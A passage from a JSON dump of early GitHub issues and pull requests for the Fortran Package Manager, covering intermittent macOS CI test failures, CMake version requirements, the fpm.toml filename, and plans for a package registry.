                    "text": "One approach to fix this is to do cargo test || cargo test. An example where the first one fails, but the second one succeeds is https://github.com/certik/fpm/runs/396031403."
                },
                {
                    "user": "certik",
                    "date": "2020-01-17 21:56:03+00:00",
                    "text": "This is precisely the kind of issue I am a bit worried with Rust, that the toolchain is not mature enough and will produce binaries that do not work (but only sometimes!). The closest error that I was able to find is:\ngolang/go#19734"
                },
                {
                    "user": "milancurcic",
                    "date": "2020-01-17 22:05:49+00:00",
                    "text": "But this likely has more to do with GitHub Actions than Rust itself. Neither you nor the person from the GitHub Forum could reproduce it locally, correct?\nI agree it's very important to have fpm work on all 3 major platforms, but I wonder if it's a bit too early to focus Mac OS work 100% of the time? Why not let it fail sometimes? We can manually trigger the build when it does fail."
                },
                {
                    "user": "certik",
                    "date": "2020-01-18 00:20:48+00:00",
                    "text": "I implemented a workaround in #20. The problem with GitHub Actions is that you cannot just restart a single build, you have to restart all the builds. The other issue is that it was already failing a lot with just 3 tests. Once we have hundreds of tests, it might end up failing all the time. For now the workaround implemented in #20 should make the CI robust enough for now. But we'll have to get back to this and fix it.\nThe reason I spent so much time on this is that I thought I can use \"bisection\" to create a minimal example that fails, and figure it out. But I failed. Essentially it's extremely unreliable to trigger the bug by submitting 20 commits. Sometimes they all pass, and sometimes they get 4 failures. And I haven't figured out a minimal example that can reliably trigger it in 20 runs. As I start removing things, the failures become less and less frequent.\nIf #20 doesn't give us reliable CI, then we can switch the macOS build to Azure pipelines or Travis-CI.\nBut having a reliable CI is a must."
                },
                {
                    "user": "certik",
                    "date": "2020-01-21 18:31:06+00:00",
                    "text": "I reported it in the Rust community also: https://users.rust-lang.org/t/github-actions-randomly-kill-a-test-program/37255"
                },
                {
                    "user": "certik",
                    "date": "2020-01-28 05:35:21+00:00",
                    "text": "I think #29 fixed this issue."
                }
            ]
        },
        {
            "number": 15,
            "user": "certik",
            "date": "2020-01-15 05:42:54+00:00",
            "title": "Remove manual tests",
            "text": "Use \"cargo test\" instead.",
            "comments": []
        },
        {
            "number": 14,
            "user": "certik",
            "date": "2020-01-14 23:15:22+00:00",
            "title": "WIP: try to reproduce the error",
            "text": "",
            "comments": []
        },
        {
            "number": 13,
            "user": "certik",
            "date": "2020-01-14 21:20:21+00:00",
            "title": "Add Rust tests",
            "text": "",
            "comments": [
                {
                    "user": "certik",
                    "date": "2020-01-14 21:39:55+00:00",
                    "text": "The Linux CI is currently broken at GitHub, but once they fix it, it should pass. The main problem that the macOS build was failing seems to be fixed by a571570. I am going to wait until the CI works again and rerun tests. Once they all pass, we can merge."
                },
                {
                    "user": "certik",
                    "date": "2020-01-14 23:08:53+00:00",
                    "text": "I tested almost 10x and the macOS built never failed, so I thought it was fixed. But now it failed twice in a row:\nrunning 3 tests\ntest test_help ... ok\ntest test_2 ... FAILED\ntest test_1 ... ok\n\nfailures:\n\n---- test_2 stdout ----\nthread 'test_2' panicked at 'Unexpected failure.\ncode=<interrupted>\nstderr=``````\ncommand=`\"/Users/runner/runners/2.163.1/work/fpm/fpm/target/x86_64-apple-darwin/debug/fpm\" \"build\"`\ncode=<interrupted>\nstdout=``````\nstderr=``````\n', /Users/runner/.cargo/registry/src/github.com-1ecc6299db9ec823/assert_cmd-0.10.2/src/assert.rs:148:17\n...\n\nThe CI is killing the runner for some reason, but I don't know why."
                },
                {
                    "user": "certik",
                    "date": "2020-01-15 04:30:59+00:00",
                    "text": "The macOS bug is still there, but by restarting the tests it typically fixes itself, so I am going to merge this and we'll eventually figure out what is causing it."
                }
            ]
        },
        {
            "number": 12,
            "user": "certik",
            "date": "2020-01-14 20:47:50+00:00",
            "title": "Draft: See if we get a failure",
            "text": "",
            "comments": [
                {
                    "user": "certik",
                    "date": "2020-01-14 21:40:14+00:00",
                    "text": "Closing in favor of #13."
                }
            ]
        },
        {
            "number": 11,
            "user": "certik",
            "date": "2020-01-14 20:42:36+00:00",
            "title": "Add Rust tests",
            "text": "",
            "comments": [
                {
                    "user": "certik",
                    "date": "2020-01-14 21:40:34+00:00",
                    "text": "Closing in favor of #13."
                }
            ]
        },
        {
            "number": 10,
            "user": "certik",
            "date": "2020-01-14 20:35:44+00:00",
            "title": "Prepare fpm to run on Windows using Rust tests",
            "text": "",
            "comments": []
        },
        {
            "number": 9,
            "user": "certik",
            "date": "2020-01-14 17:06:48+00:00",
            "title": "Run all tests using \"cargo test\" only",
            "text": "",
            "comments": [
                {
                    "user": "certik",
                    "date": "2020-01-14 17:40:14+00:00",
                    "text": "Unfortunately there seem to be random errors on macOS of the type:\n---- test_help stdout ----\nthread 'test_help' panicked at 'Unexpected failure.\ncode=<interrupted>\nstderr=``````\ncommand=`\"/Users/runner/runners/2.163.1/work/fpm/fpm/target/x86_64-apple-darwin/debug/fpm\" \"--help\"`\ncode=<interrupted>\nstdout=``````\nstderr=``````\n', /Users/runner/.cargo/registry/src/github.com-1ecc6299db9ec823/assert_cmd-0.10.2/src/assert.rs:148:17\nstack backtrace:\n   0: backtrace::backtrace::libunwind::trace\n             at /Users/runner/.cargo/registry/src/github.com-1ecc6299db9ec823/backtrace-0.3.40/src/backtrace/libunwind.rs:88\n   1: backtrace::backtrace::trace_unsynchronized\n             at /Users/runner/.cargo/registry/src/github.com-1ecc6299db9ec823/backtrace-0.3.40/src/backtrace/mod.rs:66\n   2: std::sys_common::backtrace::_print_fmt\n             at src/libstd/sys_common/backtrace.rs:77\n   3: <std::sys_common::backtrace::_print::DisplayBacktrace as core::fmt::Display>::fmt\n             at src/libstd/sys_common/backtrace.rs:61\n   4: core::fmt::write\n             at src/libcore/fmt/mod.rs:1028\n   5: std::io::Write::write_fmt\n             at /rustc/73528e339aae0f17a15ffa49a8ac608f50c6cf14/src/libstd/io/mod.rs:1412\n   6: std::io::impls::<impl std::io::Write for alloc::boxed::Box<W>>::write_fmt\n             at src/libstd/io/impls.rs:141\n   7: std::sys_common::backtrace::_print\n             at src/libstd/sys_common/backtrace.rs:65\n   8: std::sys_common::backtrace::print\n             at src/libstd/sys_common/backtrace.rs:50\n   9: std::panicking::default_hook::{{closure}}\n             at src/libstd/panicking.rs:188\n  10: std::panicking::default_hook\n             at src/libstd/panicking.rs:202\n  11: std::panicking::rust_panic_with_hook\n             at src/libstd/panicking.rs:464\n  12: std::panicking::continue_panic_fmt\n             at src/libstd/panicking.rs:373\n  13: std::thread::local::fast::Key<T>::try_initialize\n  14: assert_cmd::assert::Assert::success::{{closure}}\n             at /Users/runner/.cargo/registry/src/github.com-1ecc6299db9ec823/assert_cmd-0.10.2/src/assert.rs:148\n  15: core::option::Option<T>::unwrap_or_else\n             at /rustc/73528e339aae0f17a15ffa49a8ac608f50c6cf14/src/libcore/option.rs:419\n  16: assert_cmd::assert::Assert::success\n             at /Users/runner/.cargo/registry/src/github.com-1ecc6299db9ec823/assert_cmd-0.10.2/src/assert.rs:147\n  17: cli::test_help\n             at tests/cli.rs:9\n  18: cli::test_help::{{closure}}\n             at tests/cli.rs:6\n\nThis error only happens sometimes. So there might be some bug in the assert_cmd package on macOS."
                },
                {
                    "user": "certik",
                    "date": "2020-01-14 21:41:03+00:00",
                    "text": "Closing in favor of #13."
                }
            ]
        },
        {
            "number": 8,
            "user": "scivision",
            "date": "2020-01-14 16:43:19+00:00",
            "title": "cmake_minimum_required => 3.14",
            "text": "fpm/src/main.rs\n    \n    \n         Line 38\n      in\n      bf8ee01\n    \n    \n    \n    \n\n        \n          \n           cmake_minimum_required(VERSION 3.5.0 FATAL_ERROR) \n        \n    \n  \n\n\nThe CMake syntax used in this Rust script requires at least CMake 3.13.\nIn general in the Fortran stdlib we currently planned to use CMake 3.14 minimum.",
            "comments": [
                {
                    "user": "certik",
                    "date": "2020-01-14 21:15:15+00:00",
                    "text": "Yes, it needs to be 3.14. Is the FATAL_ERROR needed? It seems to fail fatally even without it."
                },
                {
                    "user": "milancurcic",
                    "date": "2020-01-15 03:34:02+00:00",
                    "text": "This raises a broader issue about how should we handle minimum CMake version in fpm.\nShould we set a fixed minimum cmake version for all packages brought in by fpm (even if they are okay with an earlier version)? This seems like an unnecessary overkill to me.\nOr, should we let cmake do the work and have individual package builds fail if user's cmake is inadequate? I like this better.\nAre there other approaches?"
                },
                {
                    "user": "scivision",
                    "date": "2020-01-15 07:21:52+00:00",
                    "text": "if you intend to communicate with CMake beyond simple command line interaction, there was a significant improvement in CMake 3.14 adding a file based API. That would avoid having to implement that twice for CMake < 3.14 and the deprecated CMake server, if such communication is necessary for fpm.\nThis would allow for example to introspect CMake projects that don't use fpm, but are used by fpm."
                },
                {
                    "user": "scivision",
                    "date": "2020-01-15 16:35:19+00:00",
                    "text": "In my opinion the FATAL_ERROR parameter to cmake_minimum_version() can be omitted. It does nothing for CMake releases less than about 15 years old, and those with CMake that old would have trouble building almost anything for the past few years."
                },
                {
                    "user": "certik",
                    "date": "2020-01-15 19:21:08+00:00",
                    "text": "@scivision thanks. (I can't believe I've been using CMake longer than 15 years, but it seems I have...)\nRegarding the minimal version, it requires 3.14 for Windows, and I was thinking of simply using that for now everywhere.\nOnce fpm is further along, let's revisit this. Down the road I actually think fpm should be able to build things on its own, just like Cargo does it, which would be a lot faster (since cmake's configure phase can be pretty slow).\nFor now I just want to get some minimal product working, then we'll carefully revisit all these decisions."
                },
                {
                    "user": "awvwgk",
                    "date": "2020-12-09 21:42:53+00:00",
                    "text": "This seems to be related to the removed Rust version.\nThe minimal required CMake version will become relevant again, once we implement a CMake generator. Once this becomes relevant we can either reopen this issue or create a new one."
                }
            ]
        },
        {
            "number": 7,
            "user": "certik",
            "date": "2020-01-14 15:46:23+00:00",
            "title": "CI: Test on Windows",
            "text": "",
            "comments": [
                {
                    "user": "certik",
                    "date": "2020-01-14 16:10:13+00:00",
                    "text": "Tests pass, so I'll merge this. Futher work needs to be done on Windows, but this is a start."
                }
            ]
        },
        {
            "number": 6,
            "user": "certik",
            "date": "2020-01-14 06:08:41+00:00",
            "title": "How to support packages that do not conform to our \"standard layout\" (to be specified...)",
            "text": "How to support packages that do not conform to our \"standard layout\" (to be specified...). Some examples of such a package would be reference Lapack, or Arpack. The way to do that is that we create a new repository, say certik/lapack.fpm, which will have fpm.toml, in there it would specify the url to the actual sources (https://github.com/Reference-LAPACK/lapack) and a build script, which would build the sources (using CMake in this case) and install them into some $PREFIX provided by fpm and fpm takes it from there. This approach also works for non Fortran packages --- the build script either builds it, or requires it from the system (where it can be provided by, e.g., Spack). Either way this is a clean way to hook this up into the fpm ecosystem.",
            "comments": [
                {
                    "user": "milancurcic",
                    "date": "2020-01-15 03:40:11+00:00",
                    "text": "Yes, I think fpm.toml for each project should include the exact commands that need to be executed to build the package, very much like we do in yml files for CI.\nThat said, until a need arises, I'd suggest that we take this approach for all packages, including those built with CMake, autotools, or plain Makefiles.\nIf we can make a package build in CI, we should be able to build it by fpm by making it execute commands specified in fpm.toml.\n\nThe way to do that is that we create a new repository, say certik/lapack.fpm\n\nDoes this even need to be a separate repo? Are you thinking about a repo that would be the registry of all fpm-supported packages, like what I described in #4 ?"
                }
            ]
        },
        {
            "number": 5,
            "user": "certik",
            "date": "2020-01-14 06:08:04+00:00",
            "title": "Naming of `fpm.toml`",
            "text": "Naming of fpm.toml. Cargo names Cargo.toml with capital C, and as explained in https://doc.rust-lang.org/cargo/faq.html#why-cargotoml, to \"ensure that the manifest was grouped with other similar configuration files in directory listings. Sorting files often puts capital letters before lowercase letters, ensuring files like Makefile and Cargo.toml are placed together.\" If we want to do the same, the candidates are Fpm.toml and FPM.toml. I think fpm.toml looks better. But using a capital letter would make it similar to CMakeLists.txt also. We might want to devise a different name or naming scheme. Any ideas?",
            "comments": [
                {
                    "user": "milancurcic",
                    "date": "2020-01-15 03:30:36+00:00",
                    "text": "If we consider fpm.toml, I like it better than either Fpm.toml or FPM.toml. I see little value in the sorting argument.\nIf I think of any better names than fpm.toml, I will write here, but I think fpm.toml is just fine."
                },
                {
                    "user": "ivan-pi",
                    "date": "2020-01-15 08:25:24+00:00",
                    "text": "If I get it correctly in the Rust world libraries/packages are called crates, and the package manager called Cargo is responsible for shipping these crates?\nIn line with the Rust naming, if you don't mind playing with some old Fortran terminology, crates would become decks (as in punched card decks), and the Fortran package manager would be a box/package/drawer/folder/cabinet/chest/case/dealer/dispenser/pile/loader/...?.... Unfortunately none of these words really ring. The  fpm.toml acronym is also easy enough to remember.\nFrom Wikipedia:\n\n...a box of computer programs in punched card form from the early 1970s. The deck in the middle shows what a program deck looked like after extensive editing and debugging. The cardboard box was originally used to ship blank cards and held 2000 cards."
                },
                {
                    "user": "certik",
                    "date": "2020-01-16 05:22:26+00:00",
                    "text": "Thanks @ivan-pi for the ideas.\nI think a Rust package is simply called a crate, but even I am not 100% sure. For that reason I would recommend to simply call a package as a package, so that people know what that means.\nI agree, let's just use fpm.toml."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-04-30 03:28:15+00:00",
                    "text": "Should we close this now? We've implemented it as fpm.toml."
                },
                {
                    "user": "certik",
                    "date": "2020-04-30 05:25:31+00:00",
                    "text": "Yes, can be closed.\n\u2026\nOn Wed, Apr 29, 2020, at 9:28 PM, Brad Richardson wrote:\n\n\n Should we close this now? We've implemented it as `fpm.toml`.\n\n \u2014\n You are receiving this because you authored the thread.\n Reply to this email directly, view it on GitHub\n <#5 (comment)>,\n or unsubscribe\n <https://github.com/notifications/unsubscribe-auth/AAAFAWEQACM33QVEE66CTT3RPDV5XANCNFSM4KGNRUOQ>."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-04-30 14:05:50+00:00",
                    "text": "Ok, closing."
                }
            ]
        },
        {
            "number": 4,
            "user": "certik",
            "date": "2020-01-14 06:07:30+00:00",
            "title": "Hosting of packages",
            "text": "Eventually we need to have a central place for packages similar to crates.io.\nBut for now we will use a git repository (GitHub, GitLab and other places will work) as well as just url for a tarball. That way we don't need to host anything ourselves at first and can get the initial community and ecosystem of packages built up without worrying about security and other issues that will come with maintaining our own repository.",
            "comments": [
                {
                    "user": "milancurcic",
                    "date": "2020-01-15 03:26:22+00:00",
                    "text": "Although worthwhile thinking ahead, I think we are far from this. It's a big technical challenge that requires dedicated hardware and person (people) if it's to work smoothly.\nIn the interim, as you describe, we can maintain a registry that provides all the info about available packages that fpm needs, but the source code of packages is hosted wherever its hosted by the package maintainers (GitHub, GitLab, custom url, whatever). The downside to this approach is that if the maintainer takes down the package, or changes the url, or GitHub is down, the package is unavailable through fpm. I think these are edge cases that we can live with and work around for a while, especially considering that Fortran's ecosystem is still fledgling.\nLet's discuss what would the registry look like. How about if we maintain a registry of fpm.toml files for each supported package in fpm's repo. Something like this:\nfpm/\n  Registry/\n    blas/\n      fpm.toml\n    lapack/\n      fpm.toml\n    stdlib/\n      fpm.toml\n    ...\n\nfpm.toml for a package includes all the info that fpm would need to build the package, including but not limited to:\n\nBuild backend such as CMake, autotools, or plan make\nGitHub, GitLab or custom url from which to download source code\nVersions available\nDependencies\nWhat else?\n\nFor a maintainer to add their package to fpm, they would open a PR in fpm to add their fpm.toml to the fpm Registry.\nAm I going in the right direction?"
                },
                {
                    "user": "certik",
                    "date": "2020-01-15 05:13:52+00:00",
                    "text": "Actually, the registry would be just a list of urls to download the package, so:\nhttps://github.com/certik/lapack.fpm\nhttps://github.com/fortran-lang/stdlib\n...\n\nEach of these urls will be either a tarball, or a git repository. When you download it, it contains the fpm.toml file with all the metadata. And we'll have code that will simply download each package and extract the metadata to create a nice (static) webpage and to allow to search from a command line (fpm search) --- we can automatically prepare some JSON file with package name / description / url, etc., and host it at some github repo, and fpm would simply download it. (The registry might be a combination of version + url, because a single package can have multiple verisons, so one would use, e.g., git tags for different versions.)\nRegarding the design of fpm, I would do exactly what Rust does. So a standard layout (which however can be disabled if you don't like it from Cargo.toml), pure Rust is automatic, non-Rust parts are compiled by hand by writing a build script (and listing it in Cargo.toml, then Cargo executes it before building Rust parts). From the build script you can call cmake or whatever build system one wants."
                },
                {
                    "user": "milancurcic",
                    "date": "2020-01-15 14:38:34+00:00",
                    "text": "Can you explain why you need a separate (middle-man) repo for metadata, per package?\nIf fpm gets metadata from one repo, which would then instruct it to download the package tarball from a custom url and build it with some commands, then it would have to do that transaction every time you inquire about a package. To not query a remote repo on every command, you'd want to cache results, which basically means you'd be building a local registry of packages. But if you're building a local registry of packages, you might as well maintain the registry in one repo.\nMore problematically, without a local (or remote but aggregated) registry, how do you search for available packages? With Cargo I can do:\n$ cargo search blas\nblas = \"0.20.0\"                   # The package provides wrappers for BLAS (Fortran).\ncoaster-blas = \"0.2.0\"            # Coaster library for full BLAS support\nrust-blas = \"0.1.1\"               # BLAS bindings and wrappers, fork of rblas\ncollenchyma-blas = \"0.2.0\"        # Collenchyma library for full BLAS support\nblas-src = \"0.4.0\"                # The package provides a BLAS source of choice.\nrblas = \"0.0.13\"                  # BLAS bindings and wrappers\nblas-sys = \"0.7.1\"                # The package provides bindings to BLAS (Fortran).\ncuda_blas = \"0.1.0\"               # cuBLAS API bindings.\npopcorn-blas = \"0.1.0\"            # Popcorn BLAS: Broadcasting BLAS operations for Popcorn\nnetlib-blas-provider = \"0.0.8\"    # BLAS/LAPACK provider using the Netlib implementation\n... and 54 crates more (use --limit N to see more)\n\nWould fpm search only list urls? Or would it try to fetch metadata from any number of repos that match the pattern? This won't scale.\nLooking at my local .cargo/ directory, it doesn't seem like Cargo keeps an index of all packages locally (for many many packages this doesn't scale either) but fetches from a remote registry (I assume cargo.io)."
                },
                {
                    "user": "milancurcic",
                    "date": "2020-01-15 14:42:22+00:00",
                    "text": "Regarding the design of fpm, I would do exactly what Rust does. So a standard layout (which however can be disabled if you don't like it from Cargo.toml), pure Rust is automatic, non-Rust parts are compiled by hand by writing a build script (and listing it in Cargo.toml, then Cargo executes it before building Rust parts). From the build script you can call cmake or whatever build system one wants.\n\nAre you saying that for pure Fortran code (like stdlib at the moment), you wouldn't use a build system but do the build explicitly by directly invoking the compiler? In the long run I think this is a good choice but I'm worried that it'd be a big ordeal to implement because now you have to worry about building dependency trees and all the necessary stuff that CMake was doing for us.\nOr, are you thinking about generating a CMakeLists.txt based on the scan of the source files and directories? Seems complex too."
                },
                {
                    "user": "certik",
                    "date": "2020-01-15 15:37:45+00:00",
                    "text": "Or, are you thinking about generating a CMakeLists.txt based on the scan of the source files and directories? Seems complex too.\n\nYes, that's how it is already implemented in this very small prototype of fpm. If you look here:\nhttps://github.com/fortran-lang/fpm/tree/master/tests/1\nAll you have to do is execute fpm build in that directory, and it will generate the proper CMakeLists.txt and build it and then fpm run will run the executable.\nThat's exactly how Cargo does it, and I think that's what we want also.\nAnd yes, I agree with you that using CMake as the vehicle to actually build it is the way to go initially. All fpm has to do is to construct it properly.\nIt already works, and my next step is to start doing the dependencies. Once we have a prototype of that, let's brainstorm how to host it properly. (Yes, I want fpm search to list names and descriptions just like Cargo does, so it needs to download some JSON description of all packages --- But what I am arguing is to maintain such JSON description automatically, not by hand, by downloading it from the actual packages --- we can discuss it later.)"
                }
            ]
        },
        {
            "number": 3,
            "user": "certik",
            "date": "2020-01-14 06:02:10+00:00",
            "title": "Remove GitLab-CI",
            "text": "We will use GitHub and its CI from now on.",
            "comments": []
        },
        {
            "number": 2,
            "user": "certik",
            "date": "2020-01-14 05:43:25+00:00",
            "title": "Build and run Rust tests",
            "text": "",
            "comments": [
                {
                    "user": "certik",
                    "date": "2020-01-14 06:00:39+00:00",
                    "text": "Tests pass, merging."
                }
            ]
        },
        {
            "number": 1,
            "user": "certik",
            "date": "2020-01-14 05:38:24+00:00",
            "title": "Add GitHub CI",
            "text": "",
            "comments": [
                {
                    "user": "certik",
                    "date": "2020-01-14 05:40:20+00:00",
                    "text": "I think it has to be merged first in order to run."
                }
            ]
        }
    ]
}